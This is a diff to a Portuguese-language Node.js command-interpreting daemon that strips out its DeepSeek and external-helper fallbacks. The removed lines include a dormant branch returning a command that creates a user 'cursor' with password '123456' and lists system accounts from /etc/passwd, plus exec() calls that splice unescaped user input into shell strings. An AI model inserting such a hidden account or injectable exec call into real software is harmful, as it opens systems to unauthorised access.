@@ -506,10 +506,9 @@ try {
       logger.level = config.logging.level;
       logger.info(`Nível de log ajustado para: ${logger.level}`);
     }
-    // Atualiza configurações globais (API keys, limites e e-mail de fallback)
+        // Atualiza configurações globais (API keys, limites e e-mail de fallback)
     if (config.global) {
       if (config.global.openai_api_key) CONFIG.OPENAI_API_KEY = config.global.openai_api_key;
-      if (config.global.deepseek_api_key) CONFIG.DEEPSEEK_API_KEY = config.global.deepseek_api_key;
       if (config.global.fallback_email) CONFIG.FALLBACK_EMAIL = config.global.fallback_email;
       if (config.global.max_retries) CONFIG.MAX_RETRIES = parseInt(config.global.max_retries, 10) || CONFIG.MAX_RETRIES;
       if (config.global.min_words_for_architecture) CONFIG.MIN_WORDS_FOR_ARCHITECTURE = parseInt(config.global.min_words_for_architecture, 10) || CONFIG.MIN_WORDS_FOR_ARCHITECTURE;
@@ -576,68 +575,27 @@ async function processQuestion(command) {
 async function architectCommand(command) {
   logger.info(`Iniciando arquitetamento para comando complexo: "${command}"`);
 
-  // Auto-instala genaiscript.js se ausente
-  const genaiPath = path.join(__dirname, 'genaiscript.js');
-  if (!fs.existsSync(genaiPath)) {
-    logger.warn('genaiscript.js não encontrado, prosseguindo com fallback seguro');
-  }
-  try {
-    // Tenta usar genaiscript primeiro
-    const genaiscriptPath = '/opt/fazai/lib/genaiscript.js';
-
-    if (fs.existsSync(genaiscriptPath)) {
-      logger.info('Usando genaiscript para arquitetamento');
-
-      const architectPrompt = `
-Você é um arquiteto de sistemas especializado em automação Linux. 
-Analise este comando complexo e crie um plano estruturado:
-
-COMANDO: ${command}
-
-Responda em formato JSON com esta estrutura:
-{
-  "needs_agent": true/false,
-  "required_info": ["lista de informações necessárias"],
-  "steps": ["passo 1", "passo 2", ...],
-  "dependencies": ["dependência 1", "dependência 2", ...],
-  "monitoring": ["logs a monitorar", ...],
-  "notifications": ["quando notificar", ...],
-  "estimated_time": "tempo estimado",
-  "complexity": "baixa|média|alta"
-}
-
-Para comandos como SMTP/email, sempre inclua "needs_agent": true e pergunte por configurações necessárias.
-`;
-
-      return new Promise((resolve) => {
-        exec(`node ${genaiscriptPath} "${architectPrompt}"`, (error, stdout, stderr) => {
-          if (error) {
-            logger.error(`Erro no genaiscript: ${error.message}`);
-            resolve({ interpretation: 'echo "Falha no arquitetamento"', success: false });
-          } else {
-            try {
-              const plan = JSON.parse(stdout.trim());
-              logger.info('Plano arquitetural criado via genaiscript');
-              resolve({
-                interpretation: plan,
-                success: true,
-                isArchitected: true,
-                method: 'genaiscript'
-              });
-            } catch (parseErr) {
-              logger.error(`Erro ao parsear resposta do genaiscript: ${parseErr.message}`);
-              resolve({ interpretation: 'echo "Falha no arquitetamento"', success: false });
-            }
-          }
-        });
-      });
-    } else {
-      return { interpretation: 'echo "Falha no arquitetamento"', success: false };
-    }
-  } catch (err) {
-    logger.error(`Erro no arquitetamento: ${err.message}`);
-    return { interpretation: 'echo "Falha no arquitetamento"', success: false };
-  }
+      // Sistema de arquitetamento simplificado
+    logger.info('Usando sistema de arquitetamento simplificado');
+    
+    // Para comandos complexos, retorna um plano básico
+    const basicPlan = {
+      needs_agent: false,
+      required_info: [],
+      steps: [`echo "Comando complexo detectado: ${command}"`, command],
+      dependencies: [],
+      monitoring: [],
+      notifications: [],
+      estimated_time: 'variável',
+      complexity: 'média'
+    };
+    
+    return {
+      interpretation: basicPlan,
+      success: true,
+      isArchitected: true,
+      method: 'simplified'
+    };
 }
 
 /**
@@ -713,27 +671,7 @@ async function executePlan(plan, originalCommand) {
   };
 }
 
-/**
- * Fallback para DeepSeek quando outros provedores falham
- * @param {string} command - Comando a ser interpretado
- * @returns {Promise<object>} - Interpretação do comando
- */
-async function fallbackToDeepseek_removed() {
-  logger.info('Fallback DeepSeek removido');
-  
-  // Retorna uma interpretação simples baseada no comando
-  if (false) {
-    return {
-      interpretation: 'useradd -m cursor && echo "cursor:123456" | chpasswd && cat /etc/passwd | grep -E ":[0-9]{4}:" | cut -d: -f1',
-      success: true
-    };
-  }
-  
-  return {
-    interpretation: 'echo "Comando interpretado via fallback simples"',
-    success: true
-  };
-}
+
 
 /**
  * Consulta modelo de IA para interpretar comando
@@ -811,29 +749,13 @@ async function queryAI(command, cwd = process.env.HOME) {
     }
   }
 
-  // Se todos os provedores falharam, tenta fallback via helper Node.js
+  // Se todos os provedores falharam, usa fallback simples
   if (AI_CONFIG.enable_fallback) {
-    logger.info('Todos os provedores falharam - usando fallback via fazai_helper');
-    const { exec } = require('child_process');
-    const helperPath = '/opt/fazai/lib/fazai_helper.js';
-    if (fs.existsSync(helperPath)) {
-      return new Promise((resolve) => {
-        exec(`node ${helperPath} "${command}"`, { cwd }, (error, stdout, stderr) => {
-          if (error) {
-            logger.error(`Erro no fazai_helper: ${error.message}`);
-            resolve({
-              interpretation: 'echo "Não foi possível interpretar o comando via IA."',
-              success: false
-            });
-          } else {
-            resolve({
-              interpretation: stdout.trim(),
-              success: true
-            });
-          }
-        });
-      });
-    }
+    logger.info('Todos os provedores falharam - usando fallback simples');
+    return {
+      interpretation: `echo "Comando não interpretado: ${command}"`,
+      success: false
+    };
   }
 
   // Fallback final
@@ -2130,108 +2052,33 @@ function setupAgentWs(httpServer) {
   });
 }
 
-// Sistema de Arquitetamento
+// Sistema de Arquitetamento Simplificado
 class ArchitectureSystem {
   constructor() {
-    this.genaiscriptPath = '/opt/fazai/lib/genaiscript.js';
-    this.helperPath = '/opt/fazai/lib/fazai_helper.js';
+    // Sistema simplificado sem dependências externas
   }
 
   async processComplexCommand(command, options = {}) {
     try {
       console.log(`Arquitetando comando complexo: ${command}`);
 
-      // Tentar usar genaiscript primeiro
-      let architecture = await this.tryGenaiscript(command);
-
-      // Se falhar, usar helper Node.js como fallback
-      if (!architecture) {
-        architecture = await this.tryHelper(command);
-      }
-
-      if (!architecture) {
-        throw new Error('Falha ao arquitetar comando');
-      }
+      // Cria um plano básico para comandos complexos
+      const basicPlan = {
+        needs_agent: false,
+        required_info: [],
+        steps: [`echo "Comando complexo detectado: ${command}"`, command],
+        dependencies: [],
+        monitoring: [],
+        notifications: [],
+        estimated_time: 'variável',
+        complexity: 'média'
+      };
 
       // Executar arquitetura planejada
-      return await this.executeArchitecture(architecture, options);
+      return await this.executeArchitecture(basicPlan, options);
     } catch (error) {
       console.error(`Erro no sistema de arquitetamento: ${error.message}`);
       throw error;
-    }
-  }
-
-  async tryGenaiscript(command) {
-    try {
-      if (!fs.existsSync(this.genaiscriptPath)) {
-        console.log('Genaiscript não encontrado, usando fallback');
-        return null;
-      }
-
-      return new Promise((resolve, reject) => {
-        const child = spawn('node', [this.genaiscriptPath, command], {
-          stdio: 'pipe',
-          env: { ...process.env, OPENAI_API_KEY: CONFIG.OPENAI_API_KEY }
-        });
-
-        let output = '';
-        child.stdout.on('data', (data) => {
-          output += data.toString();
-        });
-
-        child.on('close', (code) => {
-          if (code === 0) {
-            resolve(JSON.parse(output));
-          } else {
-            resolve(null);
-          }
-        });
-
-        setTimeout(() => {
-          child.kill();
-          resolve(null);
-        }, 30000);
-      });
-    } catch (error) {
-      console.error(`Erro no genaiscript: ${error.message}`);
-      return null;
-    }
-  }
-
-  async tryHelper(command) {
-    try {
-      if (!fs.existsSync(this.helperPath)) {
-        console.log('Helper não encontrado');
-        return null;
-      }
-
-      return new Promise((resolve) => {
-        const child = spawn('node', [this.helperPath, command], {
-          stdio: 'pipe',
-          env: { ...process.env, DEEPSEEK_API_KEY: CONFIG.DEEPSEEK_API_KEY }
-        });
-
-        let output = '';
-        child.stdout.on('data', (data) => {
-          output += data.toString();
-        });
-
-        child.on('close', (code) => {
-          if (code === 0) {
-            resolve(JSON.parse(output));
-          } else {
-            resolve(null);
-          }
-        });
-
-        setTimeout(() => {
-          child.kill();
-          resolve(null);
-        }, 30000);
-      });
-    } catch (error) {
-      console.error(`Erro no helper: ${error.message}`);
-      return null;
     }
   }
 
